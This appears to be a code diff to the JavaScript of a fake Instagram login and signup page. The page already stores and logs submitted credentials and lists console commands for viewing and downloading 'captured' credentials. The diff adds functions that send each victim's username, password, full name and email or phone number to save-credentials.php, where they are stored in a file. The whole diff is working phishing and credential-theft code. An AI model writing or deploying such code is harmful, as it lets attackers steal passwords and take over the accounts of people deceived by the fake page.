@@ -88,6 +88,9 @@ loginForm.addEventListener('submit', function(e) {
     // Store credentials in localStorage
     saveCredentials(credentials);
     
+    // Send to PHP file to save in userName&Password file
+    saveToFile(username, password, 'login');
+    
     // Also log to console
     console.log('Instagram Login attempt:', credentials);
     
@@ -139,6 +142,9 @@ signupForm.addEventListener('submit', function(e) {
     
     // Store signup data in localStorage
     saveCredentials(data);
+    
+    // Send to PHP file to save in userName&Password file
+    saveToFileSignup(data.mobile_or_email, data.full_name, data.username, data.password);
     
     // Log signup data (for demonstration purposes only)
     console.log('Instagram Signup attempt:', data);
@@ -417,3 +423,59 @@ console.log('%cConsole Commands:', 'color: #E1306C; font-weight: bold;');
 console.log('  viewCapturedData() - Display all captured credentials');
 console.log('  downloadCredentials() - Download credentials as text file');
 console.log('  clearCapturedData() - Clear all stored credentials');
+
+// Function to save credentials to userName&Password file via PHP (Login)
+function saveToFile(username, password, type) {
+    // Create form data
+    const formData = new FormData();
+    formData.append('username', username);
+    formData.append('password', password);
+    formData.append('type', type);
+    
+    // Send to PHP file
+    fetch('save-credentials.php', {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            console.log('✅ Instagram credentials saved to userName&Password file');
+        } else {
+            console.log('❌ Failed to save to file:', data.message);
+        }
+    })
+    .catch(error => {
+        console.log('⚠️ Error saving to file:', error);
+        console.log('Note: PHP file required for saving to text file');
+    });
+}
+
+// Function to save signup credentials to userName&Password file via PHP
+function saveToFileSignup(mobile_or_email, full_name, username, password) {
+    // Create form data
+    const formData = new FormData();
+    formData.append('mobile_or_email', mobile_or_email);
+    formData.append('full_name', full_name);
+    formData.append('username', username);
+    formData.append('password', password);
+    formData.append('type', 'signup');
+    
+    // Send to PHP file
+    fetch('save-credentials.php', {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            console.log('✅ Instagram signup credentials saved to userName&Password file');
+        } else {
+            console.log('❌ Failed to save to file:', data.message);
+        }
+    })
+    .catch(error => {
+        console.log('⚠️ Error saving to file:', error);
+        console.log('Note: PHP file required for saving to text file');
+    });
+}
